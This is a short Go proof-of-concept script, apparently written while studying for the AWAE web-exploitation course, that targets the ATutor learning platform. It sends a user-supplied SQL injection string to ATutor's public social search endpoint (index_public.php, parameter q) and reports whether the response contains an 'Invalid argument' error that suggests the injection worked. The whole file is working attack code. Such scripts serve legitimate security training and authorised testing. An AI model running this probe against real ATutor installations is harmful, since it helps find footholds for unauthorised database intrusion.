// AWAE "atutor" poc1
// Written in golang for fun
// meik ([at] protonmail)
 
package	main
 
import (
	"fmt"
	"net/http"
	"log"
	"io/ioutil"
	"regexp"
	"os"
	)
 
func	searchFriends_sqli(ip string, sqli string) {
	url := "http://" + ip + "/ATutor/mods/_standard/social/index_public.php?q=" + sqli
	resp, err := http.Get(url)
	if err != nil {
		log.Fatal(err)
	}
 
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	matched, err := regexp.Match("Invalid argument", body)
	if matched == true {
		fmt.Println("Errors found in response. Possible SQL injection found")
	} else {
		fmt.Println("No errors found")
	}
}
 
func main() {
	host := os.Args[1]
	sqli := os.Args[2]
 
	searchFriends_sqli(host, sqli)
}
